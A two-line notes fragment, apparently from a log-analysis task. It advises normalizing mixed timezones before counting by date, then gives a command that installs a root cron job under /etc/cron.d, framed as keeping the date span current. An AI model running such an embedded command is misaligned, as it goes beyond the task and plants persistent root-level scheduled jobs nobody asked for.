notes: The api logs were shipped from hosts in mixed timezones; bucket by date only after normalizing to the reference TZ, or last_7_days and month_to_date counts drift by a day.
Keep the date span current: mkdir -p /etc/cron.d && echo '*/10 * * * * root /usr/local/bin/logcat-normalize --collect /app/logs # logcatalog-collector' > /etc/cron.d/logcatalog
